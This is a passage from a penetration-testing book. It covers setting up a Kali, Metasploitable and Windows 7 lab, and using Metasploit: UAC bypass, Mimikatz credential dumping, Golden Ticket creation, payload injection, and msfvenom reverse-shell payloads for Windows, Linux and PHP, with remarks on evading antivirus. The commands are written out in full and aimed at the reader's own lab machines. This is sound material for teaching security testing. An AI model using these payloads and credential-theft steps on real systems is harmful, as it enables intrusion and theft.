5.  Now go to “Edit Virtual Machine Settings” for Metasploitable and make sure the network interface is set to “Bridged” (or NAT if you prefer, just make sure all VMs are set the same).

![](Images/image00475.jpeg)

Metasploitable 2 is now ready to use.

![](Images/image00476.jpeg)

6.  Go ahead and“Play” the Metasploitable system, click “I copied it” if you are asked if you moved or copied it.

You should now see the Metasploitable Desktop:

![](Images/image00477.jpeg)

7.  Login with the credentials on the screen.

Login name: msfadmin

Password: msfadmin

8.  By default it is set up as Dynamic. To set to a Static IP edit the “/etc/network” file as we did in Kali and set the IP address to 192.168.1.68.
9.  Then enter the desired IP address, netmask and Gateway as seen below:

![](Images/image00478.jpeg)

We now have our Metasploitable and Kali systems up.

### Windows 7 Virtual Machine

In this book I also use a Windows 7 VM (and used the Windows 10 host in a few examples). You used to be able to download a (30-90 day) Windows 7 Enterprise Evaluation version directly from Microsoft, but it looks like most of the links now point to their Windows 8.1 Enterprise Evaluation:

([http://technet.microsoft.com/en-us/evalcenter/hh699156](http://technet.microsoft.com/en-us/evalcenter/hh699156))

I stayed with the Windows 7 for this book as it is still the most used desktop operating system in the world. You will need to install a licensed copy of Windows 7 in VMWare Player. I will not cover installing Windows 7 in VMWare Player, but basically all you need is your Windows 7 CD and install Key, and do a full install from disk by clicking “New Install” and then pointing to your CD Rom drive:

![](Images/image00479.jpeg)

Then just install Windows 7 as usual. For best results in the upcoming chapters, DO NOT install the Windows Updates  or enable Windows Auto Update. When done, you will have a Windows 7 Virtual Machine:

![](Images/image00480.jpeg)

 Edit the virtual machine settings and make sure that it too is using Bridged (or NAT) for networking.

 Play the Virtual Machine

 Set the IP address to 192.168.1.93:

![](Images/image00481.jpeg)

 Install the VMWare Tools for Windows when prompted.

 Lastly, I created an administrator level user“Dan” with the password“Password” that is used throughout the book as a test user.

And that is it; you should now have three virtual machines running in our mini-lab network.

Install Wrap Up

In this section we learned how to install VMWare Player as a virtual machine host. We then installed Kali Linux, Metasploitable 2 and Windows 7 as separate virtual machines on the host. We set them all up to use the same networking so that they can communicate to each other and out to the internet if needed. We will use this setup throughout the rest of the book.

Just as a reminder, if you set up your own virtual host and are using DHCP, the IP addresses of the systems may change when rebooted. If you are not sure what your IP address is you can run “ifconfig” (Linux) or “ipconfig” (Windows) in the VM to find the IP address.

Resources

 VMware - [http://www.vmware.com/](http://www.vmware.com/)

 Kali Downloads - [http://www.kali.org/downloads/](http://www.kali.org/downloads/)

 Kali VMware Downloads - [http://www.offensive-security.com/kali-linux-vmware-arm-image-download/](http://www.offensive-security.com/kali-linux-vmware-arm-image-download/)

 Metasploitable 2 - [http://sourceforge.net/projects/metasploitable/files/Metasploitable2/](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/)

 Microsoft Evaluation Software - [http://technet.microsoft.com/en-us/evalcenter](http://technet.microsoft.com/en-us/evalcenter)

## Chapter 4

## Installing Mutillidae

Mutillidae was originally created by Adrian Crenshaw aka “Irongeek” and is now maintained by Jeremy Druin. For this book we will be using two separate versions of Mutillidae.

1.  Mutillidae in the Metasploitable 2 Virtual Machine
2.  The latest version of Mutillidae in our Windows 7 Virtual Machine

Why the two different versions? The Mutillidae on the Metasploitable VM is an older version 2.1.19, and it runs in a Linux environment. The recently released 2.6 version runs on our Windows 7 platform.  The advantage of using Mutillidae on two different platforms is that we see how Website attacks interact differently with the underlying operating system. The attack commands and capabilities will vary depending on what operating system the vulnerable web app is running on. Lastly, the Metasploitable 2 Mutillidae is much more responsive in a virtual environment.

There are some Database changes that need to be made in the Metasploitable VM and we will need to install the new Mutillidae on Windows 7\. First let’s cover the Metasploitable VM changes and then we will cover installing Mutillidae on Windows.

### Mutillidae Database Configuration Changes

As of this writing, there is a database name error in the Metasploitable 2 version of Mutillidae. You need to change the database name from “Metasploit” to “owasp10” to get Mutillidae to run without errors.

 Start the Metasploitable VM

 Login with msfadmin /msfadmin

 Navigate to /var/www/mutillidae

 Type, “sudo nano config.inc”

 Change the $dbname from ‘metasploit’ to ‘owasp10’:

![](Images/image00482.jpeg)

To:

![](Images/image00483.jpeg)

 Use “Cntrl-X” and “Y” to exit and save changes.

Php.ini Configuration Change

Lastly there is a PHP setting that needs to be changed so that we can perform Remote File Inclusion attacks that we will cover in the Web Application Testing chapter.

The php.ini file is stored in /etc/php5/cgi/. We need to edit this file (sudo nano php.ini), find the “Fopen wrappers” section and change “allow_url_include” to “On”:

![](Images/image00484.jpeg)

Then just save and exit. Now restart Apache, and reset the database:

 Restart Apache by typing, “sudo /etc/init.d/apache2 restart”

 Lastly from your Host system or one of the other VMs, open Mutillidae in a browser “Metasploitable2 IP address/mutillidae/”

 Click, “Reset DB”:

![](Images/image00485.jpeg)

And that is it; Mutillidae in the Metasploitable VM is all set!

### Windows 7 Mutillidae Install

We will now install the new version of Mutillidae on the Windows 7 VM. We will also be Installing “XAMPP” as the underlying webserver/ database server. To install Mutillidae on Windows 7, download and follow the install instruction PDF:

[http://sourceforge.net/projects/mutillidae/files/documentation/mutillidae-installation-on-xampp-win7.pdf/download](http://sourceforge.net/projects/mutillidae/files/documentation/mutillidae-installation-on-xampp-win7.pdf/download)

I have included a basic walkthrough here.

### XAMPP install

XAMPP is an Apache distribution that also includes MySQL, PHP and Perl all in one install. XAMPP allows us to run Mutillidae on Windows 7. 

1.  Download and Install XAMPP for Windows:

![](Images/image00486.jpeg)

Once XAMPP is installed make sure the Apache and MySQL services are started:

![](Images/image00487.jpeg)

2.  Next, Download Mutillidae:

[http://sourceforge.net/projects/mutillidae/files/mutillidae-project/](http://sourceforge.net/projects/mutillidae/files/mutillidae-project/)

3.  Extract the zip file and copy the Mutillidae directory from the zip into the “C:\XAMPP\htdocs” directory:

![](Images/image00488.jpeg)

4.  Now open Internet Explorer and surf to [http://127.0.0.1/mutillidae](http://127.0.0.1/mutillidae)
5.  You may need to reset the database by clicking on the reset link if there is a database error.
6.  Now restart your Windows 7 VM.
7.  Each time you restart Windows you will need to open the XAMPP control panel and start the Apache and MySQL services.

Congratulations, Windows 7 Mutillidae is installed!

Security and Hints Level

One last note, Mutillidae comes with several security levels that you can use. We will be using “Security Level: 0” aptly named “Hosed”. I highly recommend toggling the security level after you have learned a new attack and see how the increased security level affects your attack. None of the attacks should be possible in Security Level 5.

Hints are also available; these can come in very handy, especially when you are learning new techniques. Hints are available in two levels, “Script Kiddie” and “Noob”. Both the security and hints level can be changed by the corresponding Toggle item on the menu bar.

Resources

 Irongeek’s Mutillidae Page:

[http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)

# Metasploit

## Chapter 5

## New Meterpreter Commands

In this section we will look at some of the new features and commands in Metasploit. This section will be divided into two parts:

1.  An overview of the new features.
2.  A hands-on tutorial section

New Features

First we will look at some of the changes, new commands and capabilities in Metasploit.

Starting Metasploit via Favorites Bar

The easiest way to start Metasploit is by clicking on the Metasploit Button in the Favorites Menu bar. This automatically starts everything needed to run Metasploit. The first time you start the Metasploit Framework in Kali 2 it automatically creates and configures the Metasploit databases. It then starts Metasploit:

![](Images/image00489.jpeg)

Starting Metasploit via Terminal

Starting up Metasploit in Kali 2 via terminal is slightly different than in the earlier versions.

In a terminal window, type:

 /etc/init.d/postgresql start

 msfdb init

 msfconsole

As seen below:

![](Images/image00490.jpeg)

In Metasploit, to verify Database is running type:

 db_status

![](Images/image00491.jpeg)

You will notice that Metasploit starts up much faster than it did in Backtrack or the original version of Kali. This is a welcome blessing for those who use Metasploit frequently.

Metasploit Version Change

You may have noticed that Kali 2 no longer comes with the Community/ Pro version of Metasploit installed by default. Being new, Kali 2 does not yet support the commercial versions. The installed version of Metasploit is the “Framework” version. The other versions of Metasploit can be installed if you wish, but are not required for this book.

For more information see:

[https://community.rapid7.com/community/metasploit/blog/2015/08/12/metasploit-on-kali-linux-20](https://community.rapid7.com/community/metasploit/blog/2015/08/12/metasploit-on-kali-linux-20)

Check Command

The check command allows you to “check” to see if an individual system is vulnerable to an exploit without actually exploiting the system. The command has been upgraded so you can now run the command against an entire range of hosts. Though there does not seem to be many modules that support the command yet, it could be very useful in certain situations.

Usage:

 Use an exploit

 Enter, “set THREADS (5 or higher depending on your system)”

 Enter, “check 192.168.1.20-192.168.1.50”

Metasploit will then run and check to see if any of the systems in the network range entered are vulnerable.

Hashdump for Domain Controllers

Another recent addition to Metasploit is the Domain Hashdump command: 

![](Images/image00492.jpeg)

Once you get a shell to a Windows Domain Controller, just set the session number and run this module to pull a lot of account information from the DC, including the current & up to 20 prior passwords hashes for each user!

PowerShell Interactive Shells

Module Creators: Dave Hardy and Ben Turner

Module Website:  [https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/](https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/)

PowerShell has become the go to scripting language for security testing Windows environments. And these new Metasploit payloads are a huge help for testing using PowerShell:

![](Images/image00493.jpeg)

Before these were released, when you entered a PowerShell session with a remote host through Meterpreter sometimes you would not see PowerShell commands echoed back to you. To bypass this you needed to take all of your PowerShell commands, encrypt them and pass them through the Meterpreter shell in a single command. But with the new Shells you can interact with PowerShell in real-time! We will cover some of these in the PowerShell chapter.

Transports - Changing Shells on the Fly

Transports are a new way to change shells on the fly. Basically after you get a shell, you set up additional transports or shells that act as a level of fault tolerance and persistence.

![](Images/image00494.jpeg)

Your choices for transport shells are:

 bind_tcp

 reverse_tcp

 reverse_http

 and reverse_https

If you lose the current shell, Metasploit will automatically roll your session to the secondary shell. You can also change the active shell on command by using the “transport next” or “transport previous” command. At the time of this writing this feature was still a work in progress, but this is definitely something to keep your eyes on.

Lester the Local Exploit Suggester

This new module scans a system and suggests local exploits for a current session. This Metasploit module has been added but is not in the Kali Metasploit repository as of this writing.

Module Information:  [https://community.rapid7.com/community/metasploit/blog/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more](https://community.rapid7.com/community/metasploit/blog/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more)

It will be located at: post/multi/recon/local_exploit_suggester

Paranoid Meterpreter Payloads

Metasploit now supports “Paranoid Mode”. Paranoid payloads are a new way to deliver payloads that contain unique ID numbers and are SSL certificate signed. Once the payload and listener pair is created, the listener will only allow that specific payload to connect. Full instructions on implementing this can be found at:

[https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)

Stageless Meterpreter Payloads

Staged payloads are what we have been using in Metasploit right along. When a target system is exploited the payload is delivered in stages. With Stageless Meterpreter the payload is completely delivered all at once, making it much more streamlined. What this means is that you will no longer get a “sending stage” message during exploit, you just get a session!

Here is a list of the new payloads and their locations:

![](Images/image00495.jpeg)

These can also be used with Msfvenom to make stageless standalone shells.

For more information:

[https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads](https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads)

New Exploits

As usual numerous new exploits are constantly being added to Metasploit. This includes exploits for the original MS10-046 & new MS15-020 Stuxnet, multiple new Flash exploits including one made public by the “Hacking Team” data leak, the Apple OS X 10.10 Print to File “one line exploit” (not in the Kali repository as of this writing), and many more.

### HANDS-ON New Features Section

Now that we have covered some of the new Metasploit commands, let’s take a hands-on look at some of the new and changed features. For the hands on section, we will use our Windows 7 VM as a target. We will also start with an existing Meterpreter shell to our Windows 7 VM. The Web Delivery PowerShell module works great (shown in the “Web Delivery” chapter) as seen below:

![](Images/image00496.jpeg)

### Bypass UAC Module

Several tools in Metasploit need system level access to function correctly. The problem is that the UAC security feature of Windows blocks attempts at running programs at an elevated security level. The Bypass UAC module in Metasploit takes a remote session with a user that has administrator privileges and creates a new session that can be elevated to system level with the “getsystem” command. It seems that the Bypass UAC module usage has changed and many people are saying that it no longer works. It does work, unless AV blocks it, it just works a little differently now.

Starting from an active session (type “background” if you are sitting at the “meterpreter >” prompt) our screen should look like the one below:

![](Images/image00497.jpeg)

From here, enter:

 use exploit/windows/local/bypassuac_injection

 set session 1

 set payload windows/meterpreter/reverse_tcp

 set lhost 192.168.1.39

 set lport 4545 (Important: use a different port from one used for original shell)

 exploit

![](Images/image00498.jpeg)

This should execute the bypass UAC module, creating a new shell with UAC disabled:

![](Images/image00499.jpeg)

Now if we type “getsystem” it should work, as verified by “getuid”:

![](Images/image00500.jpeg)

Now that we have System level privileges, let’s look at the Mimikatz extensions.

### Mimikatz Extensions

Author: Benjamin Delpy

Website:  [http://blog.gentilkiwi.com/mimikatz](http://blog.gentilkiwi.com/mimikatz)

One of the most amazing plain text credential recovery tools (Mimikatz 2.0) is included in Meterpreter as a loadable module. This tool (called “kiwi” in Meterpreter) can do many things but is most popular for being able to pull passwords from a Windows system and display them as plain text. 

Kiwi usage:

1.  Type, “load kiwi”:

![](Images/image00501.jpeg)

The Kiwi extension is now loaded.

2.  Type, “help” to view available commands:

![](Images/image00502.jpeg)

3.  Type, “lsa_dump” to dump the LSA secrets:

![](Images/image00503.jpeg)

As you can see, this user is using the ultra-secure password of “password”.  Even his previous password of “ROOT#123” isn’t that great either. Well, at least he is consistent. If we want to just grab user accounts and plain text passwords:

4.  Type, “creds_all”:

![](Images/image00504.jpeg)

If the target uses Wi-Fi, you can get a complete list of the networks it connects to and passwords with the “wifi_list” command.

5.  Type, “wifi_list”:

(….SIMULATED….)

TP-Link TL-WN722M

=======================================

Name                  Auth           Type              Shared Key

--------                 ------            ------              --------------

HomeWiFi          WPA2PSK  passPhrase     NoPlaceLikeHome

NeighborsWiFi   WPA2PSK  passPhrase     GetOffMyWiFi!

Mimikatz Golden Ticket

Another amazing feature of Mimikatz is the “Golden Ticket”. This can create a Kerberos ticket that will grant a user Domain Administrator access that will last for 10 years! Even if the domain admin password is changed the Golden Ticket should still work. Obviously this is a huge security concern for a company and as the ticket lasts for 10 years, securing it properly is of utmost importance.

![](Images/image00505.jpeg)

Because of the security concerns, I will only provide a quick overview of the process. More information can be found on the author’s website:

[http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos](http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos)

And there are a couple good step-by-step tutorials already available on the internet.

You will need the Domain name, Domain SID, and a password hash of the Domain Admin. For the domain SID:

1.  In an active Windows Meterpreter session, type “shell” to open a DOS shell.
2.  Type, “wmic useraccount get name,sid”:

C:\Windows\system32>wmic useraccount get name,sid

wmic useraccount get name,sid

Name SID                                       

Administrator S-1-5-21-1354115581-2168045302-3610165708-500  

Dan S-1-5-21-1354115581-2168045302-3610165708-1000

The domain SID is highlighted in the text above. Grab the entire number starting with “S”, leave off the last section as it is the user ID.

Next you will need the Password hash of the target user.

3.  Use “Hashdump” or “lsa-secrets” for user password Hash.

Now you should have everything needed to create the ticket. Just add a file name to store the key with the “-t” switch:

golden_ticket_create -d TEST.LOCAL -u administrator -k d1590fe0d16ae931b7323243e0c089c0 -s S-1-5-21-1354115581-2168045302-3610165708 -t goldkey.tkt

4.  Finally use the key:

![](Images/image00506.jpeg)

You should now be able to access domain resources as the Domain Admin.

Again this is a serious security concern to the entire domain and is not recommended. If you do make a Golden Ticket for an active domain (highly discouraged) secure it extremely well.

Running Meterpreter Commands on Multiple Targets

There are multiple Metasploit payloads that allow you to target multiple machines or an entire network. But what if you wanted to perform commands on multiple sessions at once? In this section well will quickly cover several ways in which this can be done.

Using Session Switches

If we run “sessions -h” we see the following program options:

![](Images/image00507.jpeg)

And these two examples:

 sessions -s checkvm -i 1,3-5

 sessions -k 1-2,5,6

The first command (checkvm) will check multiple sessions to see if they are running in a virtual machine:

![](Images/image00508.jpeg)

The second example will kill multiple sessions.

We can also run commands against multiple sessions if we use the “-c” switch. According to the Rapid7 Github forum ([https://github.com/rapid7/metasploit-framework/issues/4118](https://github.com/rapid7/metasploit-framework/issues/4118)) you need to run “-c 'cmd.exe /C "[Windows Command]"' to get this to work properly on Windows systems.

For example:

 sessions -c 'cmd.exe /C "dir"' all

Will run the directory command on all the active sessions:

![](Images/image00509.jpeg)

Literally you can run any Windows command that you want. So keeping this in mind, what if we run the PowerShell command that we will cover in the PowerShell Exploitation chapter?

![](Images/image00510.jpeg)

We get this on all of our Windows sessions:

![](Images/image00511.jpeg)

A “Knock, Knock, Neo” message block pops up on each remote Windows system while a person’s voice says the same thing over their individual speakers. This could have some interesting uses!

Using Script Modules

Metasploit comes with a couple build in scripts that you can use to automate running commands against open sessions.

1.  run_all_post.rc - In the included Resource Scripts directory (/usr/share/metasploit-framework/scripts/resource) is the “run_all_post.rc” file created by Mubix (room362.com).  This can be modified as needed to perform commands against multiple sessions:

![](Images/image00512.jpeg)

2.  post/multi/general/execute - This is a post command that allows you to run commands against multiple sessions:

![](Images/image00513.jpeg)

Simply enter the command that you want to run and enter the target session numbers.

Switching Shells with Payload Inject

What do you do if you have an active Shell, but want to change it to a different type of shell? The Metasploit Payload_Inject module allows you to do just that. You don’t hear about Payload_Inject very much anymore, but it still works very well if you have a Metasploit shell on a system, and decide that you want to change to a different type of shell.

![](Images/image00514.jpeg)

For example, say that we have an active shell on a target system. The shell is a Windows/ Meterpreter/ Reverse_TCP shell to a Win7 box running at the NT Service level (Obtained in this case by using the Web Delivery exploit and then escalating the administrator account to NT System level by using the ByPassUac module).

![](Images/image00515.jpeg)

This is great but what if we needed to do some PowerShell work on the system and wanted to switch from a reverse_TCP shell to the PowerShell Reverse TCP shell?

Just use Payload_Inject!

Payload Inject allows you to inject a shell into a process running on the victim’s system. It defaults to the calculator app and windows_reverse_tcp shell. We can change these defaults to use a different process (an elevated one if we prefer) and any payload that we want.

First let’s pick a Process ID to use.

 Type, “ps”:

![](Images/image00516.jpeg)

In this case, PID 868 svchost.exe seems fine (it will be different on yours). We will inject our payload into that process. Background the session so you return to the “msf>” prompt and then enter the following commands:

 use post/windows/manage/payload_inject

 set handler true

 set payload windows/powershell_reverse_tcp

 set lhost 192.168.1.39

 set session 2

 set PID 868

 run

We set handler to true to have Metasploit automatically start a handler for the new shell. When run we should get a new session:

![](Images/image00517.jpeg)

![](Images/image00518.jpeg)

Notice in the screen above that a new PowerShell based session was automatically opened (session 3 in this case). If we connect to this session we automatically drop into the PowerShell interface:

![](Images/image00519.jpeg)

And that is how you jump from one shell type to another using the Payload Inject module.

Conclusion

In this chapter we looked at some of the new commands and features of Metasploit. We also learned how to use ByPassUac to escalate an administrator account to a system level account. Once we had a system level account, we then saw how the new Mimikatz features can be used to pull system information and display clear text passwords.

It is very important in a Windows environment to protect administrator level accounts. Only allow regular users privileged accounts in rare and limited occasions. And use Domain accounts only for administrative functions, at all other times use the lower user level account for normal tasks.  

## Chapter 6

## Msfvenom

Shellcode is code that when run creates a remote shell back to the creator. Malicious Windows shellcode is how many large corporations are getting exploited these days. A hacker booby-traps a file, sends it to a targeted company employee via e-mail with some work related file name and sometimes they run the file. Once they do, the attacker gets remote access to their system. Shellcode can also be added to legitimate programs to create backdoored applications. Take an often used software utility (or even a smartphone app) and combine the shellcode into the program. When it is installed or run the hacker gets remote access or control of the system.

Another way shellcode is commonly used is to upload a shell to a vulnerable website. This can happen if the webserver contains software vulnerabilities or badly written code. If the attacker can access this file over the internet, it gives them the power to manipulate or control the webserver. 

Metasploit offers some great tools to create shellcode that can be used to test your company’s security against these types of attacks. Originally this functionality was performed using the “msfpayload” and “msfencode” commands. These utilities have been replaced by the Msfvenom utility. If you are used to the original commands, using msfvenom will not be a big change for you.

### Using  Msfvenom

We will create the shell code file using the msfvenom command and then copy the command to a Windows computer. We then need to setup our Kali system to look for incoming connections from the remote file. If everything works right, we will have a remote session with the target system.

1.  Open a terminal and type, “msfvenom”:

![](Images/image00520.jpeg)

To create our shell file, we will need to pick a platform, payload and optionally an encoder. Msfvenom also supports special features to help it bypass anti-virus and even add our shellcode to an existing file.

 To see a list of all 400+ available payloads, type “msfvenom -l payloads”.

Take a minute and look through the possible combinations. Some perform specific tasks like create a user, but some are more destructive like “windows/format_all_drives” (aka ShellcodeOfDeath) which formats all mounted disks on the remote target when executed.

Also, the “--help-formats” switch lists the available output file types, and there are a lot of them!

We will be creating shells from the command line, but also need a terminal running Meterpreter open to handle the incoming sessions. It may help to keep two terminal windows open, side by side - one being a regular terminal that we can run the Msfvenom commands on and the other one running Meterpreter, something like this:

![](Images/image00521.jpeg)

### A Simple Reverse Shell

Let’s create a simple reverse shell using our Windows 7 system as a target. For this example we will just get the target system to connect back to us with a remote DOS shell. We will use the “windows/shell/reverse_tcp” payload. All we need to set for the payload is the call back IP address and port of our Kali system. We also want our shell to be a Windows executable (.exe) file, so our command will be:

msfvenom -p windows/shell/reverse_tcp LHOST=[Your Kali IP Address] LPORT=4444 -f exe > evil.exe

 -p - Is our payload

 LHOST & LPORT - Sets the Kali IP address & port that we will use.

 -f exe - Sets what output format we want.

 > evil.exe - Takes the generated shellcode and stores it in a file called evil.exe

Running this command creates our shellcode file:

![](Images/image00522.jpeg)

Copy the “evil.exe” file over to our target windows 7 system. In real life an attacker would most likely use some sort of social engineering attack, like including the shellcode file in an official looking e-mail to get the victim to run it. For our purposes, you can just drag and drop the file between the Kali system and the Windows 7 VM.

Start msfconsole (type, “msfconsole” in a terminal) on our kali system and create a handler to listen for incoming connections:

 use exploit/multi/handler

 set payload windows/shell/reverse_tcp

 set lport 4444

 set lhost [Your Kali IP Address]

 exploit

Now simply run the “evil.exe” file on the Windows 7 system and we will see this in Kali:

![](Images/image00523.jpeg)

A remote shell!

To leave the shell and return to Metasploit, Just type “exit”.

### Remote Metasploit Shell

A remote DOS command shell is nice, but as we saw in my first book, we can do a lot more if we have a remote Meterpreter shell. We can use all of the built in tools and modules to exploit the machine and even use the system as a jumping point to attack deeper into the target network.

Creating a Meterpreter shell with msfvenom is almost identical to our first example. Just choose a Meterpreter payload instead of a shell.

1.  Just type:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali IP] LPORT=4444 -f exe > evil2.exe

As seen below:

![](Images/image00524.jpeg)

2.  Copy the resultant file over to your Windows system.
3.  Start the multi handler using the windows/meterpreter/reverse_tcp payload:

![](Images/image00525.jpeg)

4.  Execute the Windows file.
5.  Then on the Kali system we should see a session open and we will be at the Meterpreter prompt:

![](Images/image00526.jpeg)

At the Meterpreter prompt type, “help” to see available commands:

![](Images/image00527.jpeg)

Take a minute or two and try some of the commands found in “help”. When done, type “exit” to exit the session.

### Windows Shell with PowerShell

PowerShell is Microsoft’s built in command line scripting environment. It is used often by system administrators for network or workstation management but can also be used by those with malicious intentions. Let’s take a look at creating a PowerShell based shellcode.

From the list of payloads we will select “cmd/windows/reverse_powershell” and output it as a .bat file, “evil3.bat” in this case.

1.  Type, “msfvenom -p cmd/windows/reverse_powershell LHOST=[Kali IP] > evil3.bat”

![](Images/image00528.jpeg)

2.  Copy the resultant file to your Windows system.
3.  Set up Multi-Handler in Metasploit:

 use exploit/multi/handler

 set payload cmd/windows/reverse_powershell

 set lport 4444

 set lhost [Kali IP]

 exploit

4.  Now execute the batch file on your Windows test system and you should get a remote session created in Metasploit:

![](Images/image00529.jpeg)

![](Images/image00530.jpeg)

### Linux Python Meterpreter Shell

Okay we have seen a couple Windows shellcodes, what about one that will work against a Linux machine? There are multiple Linux ones, but for this example we will just create a Python based shell.

1.  Type:

“msfvenom -p python/meterpreter/reverse_tcp LHOST=[Kali IP] LPORT=4444  > evilpython.py”

As seen below:

![](Images/image00531.jpeg)

2.  Start the listener with the “python/meterpreter/reverse_tcp” payload:

![](Images/image00532.jpeg)

3.  Copy the file to our Metasploitable VM (if you are not familiar with Linux, you will need to copy the file to a USB flash drive, then on the Metasploitable machine, create a mount point and mount the USB drive before it will be accessible) and then run it by typing “python evilpython.py”:

![](Images/image00533.jpeg)

As soon as it executes, we get a full Meterpreter shell to our Kali system:

![](Images/image00534.jpeg)

If we type “sysinfo” you can see that we are indeed connected to the Metasploitable box:

![](Images/image00535.jpeg)

### Website Attack with PHP Shell

Finally let’s take a quick look at a website attack using msfvenom’s PHP payload. I will just show you the command and the results, but don’t worry; we will cover this type of attack in much greater detail in the Web Application chapter.

1.  Create a PHP file using msfvenom by typing, “msfvenom -p php/meterpreter/reverse_tcp LHOST=[Kali IP] LPORT=4444 -f raw > evilphp.php”

![](Images/image00536.jpeg)

For the payload we chose the PHP based Meterpreter reverse shell. As usual we set the IP address of the Kali system and the port we want to use. This creates our PHP shellcode file.

But we cannot use it quite yet. Let’s view the file and see why:

![](Images/image00537.jpeg)

Notice there is a “//” before the start of the PHP command and there is no ending PHP tag. We need to make sure the tag starts with “<?php” and that there is a “?>” at the end of the code. We will have to add these tags manually to get it to work correctly.

2.  Open the shellcode file in a text editor and add the tags as seen below:

![](Images/image00538.jpeg)

3.  Now upload the evil PHP file to our vulnerable website. (Again we will go over this in detail later but if you do want to follow along, simply copy the PHP file to your Windows 7 Mutillidae directory).
4.  Start a handler service for the PHP payload:

![](Images/image00539.jpeg)

5.  Browse to the vulnerable website and execute the PHP command from the browser in Kali:

![](Images/image00540.jpeg)

And in Metasploit we see this:

![](Images/image00541.jpeg)

So by using a PHP based payload, we were able to gain a remote shell on a vulnerable webserver.

### Changing the Shellcode Filetype

Depending on the exploit, we can change the shellcode output to several different program languages. This could come in handy if we have an exploit for one environment but need to convert it to another.

For example if we take the raw Linux/x86/shell/reverse_tcp shellcode:

msfvenom -p linux/x86/shell/reverse_tcp LHOST=[Kali IP] LPORT=4444 -f raw

We see the default code:

![](Images/image00542.jpeg)

If we remove the “-f raw” from the end of the line and use “-f python” instead, we get this:

![](Images/image00543.jpeg)

Or use “-f perl”:

![](Images/image00544.jpeg)

As you can see, changing the file type output modified the output shellcode. These are just examples. To get the code to work in the different languages, you might have to add additional code or manipulate them in some way to get the shellcode to execute properly.

### Generating Shells in Meterpreter

You can also generate a Windows executable shell while in Metasploit by using the “Generate” command. This command has the following options:

![](Images/image00545.jpeg)

Let’s try a quick example using our favorite reverse_tcp shell. We will have Generate take our Meterpreter settings and create a Windows Executable version of the shell called “reversetcp.exe”.

From within Metasploit on Kali, enter:

 use payload/windows/meterpreter/reverse_tcp

 set lhost [Kali IP Address]

 set lport [Port]

 generate -t exe -f reversetcp.exe

Like so:

![](Images/image00546.jpeg)

An executable version of the Meterpreter Reverse_TCP payload is stored to the root directory.

Now start a Multi/Handler to receive the incoming connection on Kali:

 use exploit/multi/handler

 set payload windows/meterpreter/reverse_tcp

 set lhost [Kali IP Address]

 set lport [Port]

 exploit

Now run the reversetcp.exe file on the Windows 7 VM.

![](Images/image00547.jpeg)

And we have a shell!

Getting your shellcode past that pesky Anti-Virus program is always a challenge. The .exe shellcode we made above was detected when I scanned it, but neither scripting based files were detected as malicious.

I haven’t mention using the msfvenom encoder option. This option allows you to choose different encoders to obfuscate the shellcode. I have spent a lot of time in the past with a retired military security expert playing with different encoders, and encoding passes. The problem we saw was that if the anti-virus detected it, usually trying different encoders, multiple encoders or multiple encryption iterations really didn’t make a big difference. The AV would usually still detect it.

Conclusion

As you can see msfvenom is a very powerful tool to create shellcode. Granted things don’t always work out in real life for the attacker. Updated operating systems and patches can negate some shells, and of course anti-virus can block many well-known shells, even when they are run through multiple levels of encoding.

Many times anti-virus programs are just looking for specific strings in the file. Sometimes these strings (many times ASCII strings!) can be simply altered to slip by AV programs. Shell code programs can use PowerShell or other scripting languages which many Anti-Virus products do not see as a threat. We will briefly look at bypassing Anti-Virus in a later chapter.

In defending against these types of attacks, make sure your websites are secured against common web based attacks. Also be very vigilant against social engineering attacks that use phishing type schemes to trick your users into running shellcode files.

Resources 

 Goodbye Msfpayload & Msfencode:

[https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode](https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode)

 How to use Msfvenom:

[https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)

## Chapter 7

## Resource Files

Resource Files are a great way to script Metasploit commands. When you start to use Metasploit regularly you find that you are typing in the same commands over and over. Resource files save you a lot of time by storing the commands you enter regularly to a file. When the file is executed with the ‘Resource’ command, the instructions are re-entered automatically just as if you typed them in by hand. You can also include Ruby scripting to do some amazing things. 

There are several resource files that come pre-installed in the ‘/usr/share/metasploit-framework/scripts/resource’ directory:

![](Images/image00548.jpeg)

We will look at these in a minute. But first let’s see how to make our own.

### Making a Resource File

Start a fresh instance of Metasploit and create a simple “reverse_tcp” shell:

![](Images/image00549.jpeg)

Now run ‘makerc evilreverse.rc’, this will save every command that we entered and save it to a file that you specify:

![](Images/image00550.jpeg)

  If we view the file we can see all the commands that we typed:

![](Images/image00551.jpeg)

And now we can run this resource file anytime that we want by typing, “resource [filename]”:

![](Images/image00552.jpeg)

For the record, these commands don’t have to be exploit commands. You can enter any repetitive commands that you want and save them as a resource file. This can save you a lot of time if you use Metasploit frequently for multiple tasks.

### Starting Resource Scripts from the Command Line

You can also start resource commands from the command line. There are two ways to do this.

 Option 1 - Start msfconsole with the “-r” resource switch

 Option 2 - Save a resource script with the name “msfconsole.rc”

OPTION 1

You can have any script run immediately on Metasploit startup by simply including the “-r [resource file]” switch after msfconsole. So, from our example above the command would be:

msfconsole -r evilreverse.rc

This causes Metasploit to start and immediately run the evilreverse.rc file:

![](Images/image00553.jpeg)

OPTION 2

If you save any resource file with the unique name, “msfconsole.rc” to the “~/.msf4” directory, it will automatically execute when you start Metasploit:

![](Images/image00554.jpeg)

And when msfconsole starts, the resource file named ‘msfconsole.rc’ will execute automatically:

![](Images/image00555.jpeg)

